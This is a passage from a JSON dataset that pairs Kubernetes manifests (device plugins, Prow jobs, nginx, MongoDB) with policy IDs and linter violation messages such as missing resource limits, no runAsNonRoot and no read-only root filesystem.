          - i3en.24xlarge\n                - i3en.metal\n                - inf1.24xlarge\n                - m5dn.24xlarge\n                - m5n.24xlarge\n                - p3dn.24xlarge\n                - r5dn.24xlarge\n                - r5n.24xlarge\n                - p4d.24xlarge\n      containers:\n      - image: '%s.dkr.ecr.%s.%s/eks/aws-efa-k8s-device-plugin:v0.3.3'\n        name: aws-efa-k8s-device-plugin\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n        volumeMounts:\n        - name: device-plugin\n          mountPath: /var/lib/kubelet/device-plugins\n      volumes:\n      - name: device-plugin\n        hostPath:\n          path: /var/lib/kubelet/device-plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"aws-efa-k8s-device-plugin\" is not set to runAsNonRoot"
  },
  {
    "id": "2318",
    "manifest_path": "data/manifests/the_stack_sample/sample_0583.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: aws-efa-k8s-device-plugin-daemonset\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: aws-efa-k8s-device-plugin\n  template:\n    metadata:\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n      labels:\n        name: aws-efa-k8s-device-plugin\n    spec:\n      serviceAccount: default\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: beta.kubernetes.io/instance-type\n                operator: In\n                values:\n                - c5n.18xlarge\n                - c5n.metal\n                - g4dn.metal\n                - i3en.24xlarge\n                - i3en.metal\n                - inf1.24xlarge\n                - m5dn.24xlarge\n                - m5n.24xlarge\n                - p3dn.24xlarge\n                - r5dn.24xlarge\n                - r5n.24xlarge\n                - p4d.24xlarge\n            - matchExpressions:\n              - key: node.kubernetes.io/instance-type\n                operator: In\n                values:\n                - c5n.18xlarge\n                - c5n.metal\n                - g4dn.metal\n                - i3en.24xlarge\n                - i3en.metal\n                - inf1.24xlarge\n                - m5dn.24xlarge\n                - m5n.24xlarge\n                - p3dn.24xlarge\n                - r5dn.24xlarge\n                - r5n.24xlarge\n                - p4d.24xlarge\n      containers:\n      - image: '%s.dkr.ecr.%s.%s/eks/aws-efa-k8s-device-plugin:v0.3.3'\n        name: aws-efa-k8s-device-plugin\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n        volumeMounts:\n        - name: device-plugin\n          mountPath: /var/lib/kubelet/device-plugins\n      volumes:\n      - name: device-plugin\n        hostPath:\n          path: /var/lib/kubelet/device-plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"aws-efa-k8s-device-plugin\" has cpu request 0"
  },
  {
    "id": "2319",
    "manifest_path": "data/manifests/the_stack_sample/sample_0583.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: aws-efa-k8s-device-plugin-daemonset\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: aws-efa-k8s-device-plugin\n  template:\n    metadata:\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n      labels:\n        name: aws-efa-k8s-device-plugin\n    spec:\n      serviceAccount: default\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: beta.kubernetes.io/instance-type\n                operator: In\n                values:\n                - c5n.18xlarge\n                - c5n.metal\n                - g4dn.metal\n                - i3en.24xlarge\n                - i3en.metal\n                - inf1.24xlarge\n                - m5dn.24xlarge\n                - m5n.24xlarge\n                - p3dn.24xlarge\n                - r5dn.24xlarge\n                - r5n.24xlarge\n                - p4d.24xlarge\n            - matchExpressions:\n              - key: node.kubernetes.io/instance-type\n                operator: In\n                values:\n                - c5n.18xlarge\n                - c5n.metal\n                - g4dn.metal\n                - i3en.24xlarge\n                - i3en.metal\n                - inf1.24xlarge\n                - m5dn.24xlarge\n                - m5n.24xlarge\n                - p3dn.24xlarge\n                - r5dn.24xlarge\n                - r5n.24xlarge\n                - p4d.24xlarge\n      containers:\n      - image: '%s.dkr.ecr.%s.%s/eks/aws-efa-k8s-device-plugin:v0.3.3'\n        name: aws-efa-k8s-device-plugin\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n        volumeMounts:\n        - name: device-plugin\n          mountPath: /var/lib/kubelet/device-plugins\n      volumes:\n      - name: device-plugin\n        hostPath:\n          path: /var/lib/kubelet/device-plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"aws-efa-k8s-device-plugin\" has memory limit 0"
  },
  {
    "id": "2320",
    "manifest_path": "data/manifests/the_stack_sample/sample_0584.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210421-8709509fc9\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"crier\" does not have a read-only root file system"
  },
  {
    "id": "2321",
    "manifest_path": "data/manifests/the_stack_sample/sample_0584.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210421-8709509fc9\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"crier\" not found"
  },
  {
    "id": "2322",
    "manifest_path": "data/manifests/the_stack_sample/sample_0584.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210421-8709509fc9\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"crier\" is not set to runAsNonRoot"
  },
  {
    "id": "2323",
    "manifest_path": "data/manifests/the_stack_sample/sample_0584.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210421-8709509fc9\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"crier\" has cpu request 0"
  },
  {
    "id": "2324",
    "manifest_path": "data/manifests/the_stack_sample/sample_0584.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210421-8709509fc9\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"crier\" has memory limit 0"
  },
  {
    "id": "2325",
    "manifest_path": "data/manifests/the_stack_sample/sample_0586.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: mysql\n  name: mysql\nspec:\n  ports:\n  - port: 3306\n  selector:\n    name: mysql\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:mysql])"
  },
  {
    "id": "2326",
    "manifest_path": "data/manifests/the_stack_sample/sample_0587.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx/alpine\n    ports:\n    - containerPort: 80\n    readinessProbe:\n      httpGet:\n        path: /\n        port: 80\n      initialDelaySeconds: 5\n      periodSeconds: 10\n    livenessProbe:\n      tcpSocket:\n        port: 80\n      initialDelaySeconds: 15\n      periodSeconds: 20\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx/alpine\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2327",
    "manifest_path": "data/manifests/the_stack_sample/sample_0587.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx/alpine\n    ports:\n    - containerPort: 80\n    readinessProbe:\n      httpGet:\n        path: /\n        port: 80\n      initialDelaySeconds: 5\n      periodSeconds: 10\n    livenessProbe:\n      tcpSocket:\n        port: 80\n      initialDelaySeconds: 15\n      periodSeconds: 20\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2328",
    "manifest_path": "data/manifests/the_stack_sample/sample_0587.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx/alpine\n    ports:\n    - containerPort: 80\n    readinessProbe:\n      httpGet:\n        path: /\n        port: 80\n      initialDelaySeconds: 5\n      periodSeconds: 10\n    livenessProbe:\n      tcpSocket:\n        port: 80\n      initialDelaySeconds: 15\n      periodSeconds: 20\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2329",
    "manifest_path": "data/manifests/the_stack_sample/sample_0587.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx/alpine\n    ports:\n    - containerPort: 80\n    readinessProbe:\n      httpGet:\n        path: /\n        port: 80\n      initialDelaySeconds: 5\n      periodSeconds: 10\n    livenessProbe:\n      tcpSocket:\n        port: 80\n      initialDelaySeconds: 15\n      periodSeconds: 20\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2330",
    "manifest_path": "data/manifests/the_stack_sample/sample_0587.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx/alpine\n    ports:\n    - containerPort: 80\n    readinessProbe:\n      httpGet:\n        path: /\n        port: 80\n      initialDelaySeconds: 5\n      periodSeconds: 10\n    livenessProbe:\n      tcpSocket:\n        port: 80\n      initialDelaySeconds: 15\n      periodSeconds: 20\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2331",
    "manifest_path": "data/manifests/the_stack_sample/sample_0588.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-flexvolume-driver-disallowed\n  labels:\n    app: nginx-flexvolume-driver\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - mountPath: /test\n      name: test\n      readOnly: true\n  volumes:\n  - name: test\n    flexVolume:\n      driver: example/customdriver\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2332",
    "manifest_path": "data/manifests/the_stack_sample/sample_0588.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-flexvolume-driver-disallowed\n  labels:\n    app: nginx-flexvolume-driver\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - mountPath: /test\n      name: test\n      readOnly: true\n  volumes:\n  - name: test\n    flexVolume:\n      driver: example/customdriver\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2333",
    "manifest_path": "data/manifests/the_stack_sample/sample_0588.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-flexvolume-driver-disallowed\n  labels:\n    app: nginx-flexvolume-driver\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - mountPath: /test\n      name: test\n      readOnly: true\n  volumes:\n  - name: test\n    flexVolume:\n      driver: example/customdriver\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2334",
    "manifest_path": "data/manifests/the_stack_sample/sample_0588.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-flexvolume-driver-disallowed\n  labels:\n    app: nginx-flexvolume-driver\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - mountPath: /test\n      name: test\n      readOnly: true\n  volumes:\n  - name: test\n    flexVolume:\n      driver: example/customdriver\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2335",
    "manifest_path": "data/manifests/the_stack_sample/sample_0588.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-flexvolume-driver-disallowed\n  labels:\n    app: nginx-flexvolume-driver\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - mountPath: /test\n      name: test\n      readOnly: true\n  volumes:\n  - name: test\n    flexVolume:\n      driver: example/customdriver\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2336",
    "manifest_path": "data/manifests/the_stack_sample/sample_0590.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20200812-8936af3bd4\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"label-sync\" does not have a read-only root file system"
  },
  {
    "id": "2337",
    "manifest_path": "data/manifests/the_stack_sample/sample_0590.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20200812-8936af3bd4\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"label-sync\" is not set to runAsNonRoot"
  },
  {
    "id": "2338",
    "manifest_path": "data/manifests/the_stack_sample/sample_0590.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20200812-8936af3bd4\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"label-sync\" has cpu request 0"
  },
  {
    "id": "2339",
    "manifest_path": "data/manifests/the_stack_sample/sample_0590.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20200812-8936af3bd4\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-incubator,kubernetes-sigs\n          - --token=/etc/github/oauth\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: label-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"label-sync\" has memory limit 0"
  },
  {
    "id": "2340",
    "manifest_path": "data/manifests/the_stack_sample/sample_0592.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mongo-posts\n  name: mongo-posts\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongo-posts\n  template:\n    metadata:\n      labels:\n        app: mongo-posts\n    spec:\n      containers:\n      - image: mongo:4.4.6\n        name: mongo-posts\n        args:\n        - --dbpath\n        - /data/db\n        livenessProbe:\n          exec:\n            command:\n            - mongo\n            - --disableImplicitSessions\n            - --eval\n            - db.adminCommand('ping')\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 6\n        readinessProbe:\n          exec:\n            command:\n            - mongo\n            - --disableImplicitSessions\n            - --eval\n            - db.adminCommand('ping')\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 6\n        env:\n        - name: MONGO_INITDB_ROOT_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: mongo-creds\n              key: username\n        - name: MONGO_INITDB_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongo-creds\n              key: password\n        volumeMounts:\n        - name: mongo-data-dir-posts\n          mountPath: /data/db\n      volumes:\n      - name: mongo-data-dir-posts\n        persistentVolumeClaim:\n          claimName: mongo-data-posts\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mongo-posts\" does not have a read-only root file system"
  },
  {
    "id": "2341",
    "manifest_path": "data/manifests/the_stack_sample/sample_0592.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mongo-posts\n  name: mongo-posts\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongo-posts\n  template:\n    metadata:\n      labels:\n        app: mongo-posts\n    spec:\n      containers:\n      - image: mongo:4.4.6\n        name: mongo-posts\n        args:\n        - --dbpath\n        - /data/db\n        livenessProbe:\n          exec:\n            command:\n            - mongo\n            - --disableImplicitSessions\n            - --eval\n            - db.adminCommand('ping')\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 6\n        readinessProbe:\n          exec:\n            command:\n            - mongo\n            - --disableImplicitSessions\n            - --eval\n            - db.adminCommand('ping')\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 6\n        env:\n        - name: MONGO_INITDB_ROOT_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: mongo-creds\n              key: username\n        - name: MONGO_INITDB_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongo-creds\n              key: password\n        volumeMounts:\n        - name: mongo-data-dir-posts\n          mountPath: /data/db\n      volumes:\n      - name: mongo-data-dir-posts\n        persistentVolumeClaim:\n          claimName: mongo-data-posts\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mongo-posts\" is not set to runAsNonRoot"
  },
  {
    "id": "2342",
    "manifest_path": "data/manifests/the_stack_sample/sample_0592.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mongo-posts\n  name: mongo-posts\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongo-posts\n  template:\n    metadata:\n      labels:\n        app: mongo-posts\n    spec:\n      containers:\n      - image: mongo:4.4.6\n        name: mongo-posts\n        args:\n        - --dbpath\n        - /data/db\n        livenessProbe:\n          exec:\n            command:\n            - mongo\n            - --disableImplicitSessions\n            - --eval\n            - db.adminCommand('ping')\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 6\n        readinessProbe:\n          exec:\n            command:\n            - mongo\n            - --disableImplicitSessions\n            - --eval\n            - db.adminCommand('ping')\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 6\n        env:\n        - name: MONGO_INITDB_ROOT_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: mongo-creds\n              key: username\n        - name: MONGO_INITDB_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongo-creds\n              key: password\n        volumeMounts:\n        - name: mongo-data-dir-posts\n          mountPath: /data/db\n      volumes:\n      - name: mongo-data-dir-posts\n        persistentVolumeClaim:\n          claimName: mongo-data-posts\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mongo-posts\" has cpu request 0"
  },
  {
    "id": "2343",
    "manifest_path": "data/manifests/the_stack_sample/sample_0592.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mongo-posts\n  name: mongo-posts\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongo-posts\n  template:\n    metadata:\n      labels:\n        app: mongo-posts\n    spec:\n      containers:\n      - image: mongo:4.4.6\n        name: mongo-posts\n        args:\n        - --dbpath\n        - /data/db\n        livenessProbe:\n          exec:\n            command:\n            - mongo\n            - --disableImplicitSessions\n            - --eval\n            - db.adminCommand('ping')\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 6\n        readinessProbe:\n          exec:\n            command:\n            - mongo\n            - --disableImplicitSessions\n            - --eval\n            - db.adminCommand('ping')\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 6\n        env:\n        - name: MONGO_INITDB_ROOT_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: mongo-creds\n              key: username\n        - name: MONGO_INITDB_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongo-creds\n              key: password\n        volumeMounts:\n        - name: mongo-data-dir-posts\n          mountPath: /data/db\n      volumes:\n      - name: mongo-data-dir-posts\n        persistentVolumeClaim:\n          claimName: mongo-data-posts\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mongo-posts\" has memory limit 0"
  },
  {
    "id": "2344",
    "manifest_path": "data/manifests/the_stack_sample/sample_0593.yaml",
